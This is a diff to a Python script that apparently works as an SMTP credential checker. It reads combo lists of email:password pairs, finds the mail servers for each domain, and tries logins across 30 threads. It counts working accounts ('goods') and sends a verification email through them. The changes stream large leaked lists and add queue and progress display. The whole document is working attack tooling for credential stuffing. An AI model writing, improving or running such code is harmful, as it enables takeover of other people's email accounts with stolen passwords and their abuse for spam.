@@ -1,4 +1,4 @@
-import socket,threading,base64,datetime,sys,ssl,smtplib,time,re,os,sys,random,signal,queue
+import socket,threading,base64,datetime,sys,ssl,smtplib,time,re,os,sys,random,signal,queue,subprocess
 from dns import resolver
 from email.mime.text import MIMEText
 
@@ -38,7 +38,7 @@ def get_mx_server(domain):
 				try:
 					s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 					s.setblocking(0)
-					s.settimeout(timeout)
+					s.settimeout(1)
 					if p==465:
 						s = ssl.wrap_socket(s)
 					s.connect((h, p))
@@ -57,32 +57,37 @@ def quit(signum, frame):
 def is_valid_email(email):
 	return re.match(r'^[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}$', email.lower())
 
-def find_email_password_indexes(lines):
+def find_email_password_indexes(list_filename):
 	email_index = False
 	password_index = False
-	for line in lines:
-		line = re.sub('[;,\t| ]', ':', line.lower())
-		email = re.search(r'[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}', line)
-		if email_index is False and email:
-			email_index = line.split(email.group(0))[0].count(':') or 0
-		if password_index is False and re.search(r'@.+123', line):
-			password_index = line.split('123')[0].count(':')
-		if email_index is not False and password_index is not False:
-			return (email_index, password_index)
+	with open(list_filename) as fp:
+		for line in fp:
+			line = re.sub('[;,\t| ]', ':', line.lower())
+			email = re.search(r'[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}', line)
+			if email_index is False and email:
+				email_index = line.split(email.group(0))[0].count(':') or 0
+			if password_index is False and re.search(r'@.+123', line):
+				password_index = line.split('123')[0].count(':')
+			if email_index is not False and password_index is not False:
+				return (email_index, password_index)
 	password_index = email_index+1
 	return (email_index, password_index)
 
 def print_statuses(thread_name, thread_status):
-	global threads_statuses, threads_count, threads_counter, goods
+	global threads_statuses, threads_count, threads_counter, goods, quee
 	sys.stdout.write('\033[F'*threads_count+'\033[F')
 	threads_statuses[thread_name] = thread_status
 	print((
+		f'[ queue size: {c.BOLD}{quee.qsize()}{c.END} ]'+
 		f'[ cpu load: {c.BOLD}{round(os.getloadavg()[0]/os.cpu_count(),2)}{c.END} ]'+
 		f'[ threads: {c.BOLD}{threads_counter}{c.END} ]'+
 		f'[ goods: {c.BOLD}{c.GREEN}{goods}{c.END} ]'
 	).rjust(144))
 	for i in range(threads_count):
 		print(threads_statuses['thread'+str(i)])
+
+def wc_count(filename):
+	return int(subprocess.check_output(['wc', '-l', filename]).split()[0])
 
 def smtp_connect_and_send(smtp_server, port, smtp_user, password):
 	global verify_email, timeout
@@ -142,42 +147,45 @@ signal.signal(signal.SIGINT, quit)
 quee = queue.Queue()
 results = queue.Queue()
 goods = 0
+threads_count = 30
 threads_counter = 0
 threads_statuses = {}
 mx_cache = {}
-timeout = 5
+timeout = 3
+threads_started = False
 try:
-	lines = open(sys.argv[1],'r').read().splitlines()
+	list_filename = sys.argv[1]
 	smtp_filename = sys.argv[1].split('.')
 	smtp_filename[-2] = smtp_filename[-2]+'_smtp'
 	smtp_filename = '.'.join(smtp_filename)
 	errors_filename = smtp_filename.replace('_smtp', '_errors')
 	verify_email = sys.argv[2]
-	threads_count = int(sys.argv[3])
-	if not is_valid_email(verify_email) or threads_count<1:
+	if not is_valid_email(verify_email):
 		raise
 except:
-	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com numthreads')
-email_index, password_index = find_email_password_indexes(lines)
+	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com')
+email_index, password_index = find_email_password_indexes(list_filename)
+total_lines = wc_count(list_filename)
 print(f'verification email: {c.BOLD}{verify_email}{c.END}')
 print(f'email_index: {c.BOLD}{str(email_index)}{c.END}')
 print(f'password_index: {c.BOLD}{str(password_index)}{c.END}')
-for line in lines:
-	if line.count('|')==3:
-		quee.put((line.split('|')))
-	else:
-		line = re.sub('[;,\t| ]', ':', line)
-		fields = line.split(':')
-		if len(fields)>1 and fields[email_index] and len(fields[password_index])>7 and not re.search(r'@(gmail\.com|mail\.ru)', fields[email_index]):
-			quee.put((False,False,fields[email_index],fields[password_index]))
-total = quee.qsize()
+print(f'total lines to procceed: {c.BOLD}{str(total_lines)}{c.END}')
 sys.stdout.write('\n'*threads_count)
-for i in range(threads_count):
-	threading.Thread(name='thread'+str(i),target=worker_item,args=(quee,results),daemon=True).start()
-	threads_counter += 1
-	threads_statuses['thread'+str(i)] = 'no data'
-with alive_bar(total,bar='blocks',title='Progress:') as progress_bar:
+with alive_bar(total_lines, bar='blocks', title='Progress:') as progress_bar, open(list_filename) as fp:
 	while True:
+		while quee.qsize()<threads_count*2:
+			line = fp.readline().strip()
+			if not line:
+				break
+			if line.count('|')==3:
+				quee.put((line.split('|')))
+			else:
+				line = re.sub('[;,\t| ]', ':', line)
+				fields = line.split(':')
+				if len(fields)>1 and fields[email_index] and len(fields[password_index])>7 and not re.search(r'@(gmail\.com|mail\.ru)', fields[email_index]):
+					quee.put((False,False,fields[email_index],fields[password_index]))
+				else:
+					progress_bar()
 		if not results.empty():
 			thread_name, thread_status = results.get()
 			print_statuses(thread_name, '\b'*10+thread_status)
@@ -186,3 +194,9 @@ with alive_bar(total,bar='blocks',title='Progress:') as progress_bar:
 		if threads_counter == 0 and quee.empty():
 			print('\b'*10+f'{c.GREEN}All done.{c.END}')
 			break
+		if not threads_started:
+			while threads_counter < threads_count:
+				threading.Thread(name='thread'+str(threads_counter), target=worker_item, args=(quee,results), daemon=True).start()
+				threads_statuses['thread'+str(threads_counter)] = 'no data'
+				threads_counter += 1
+			threads_started = True
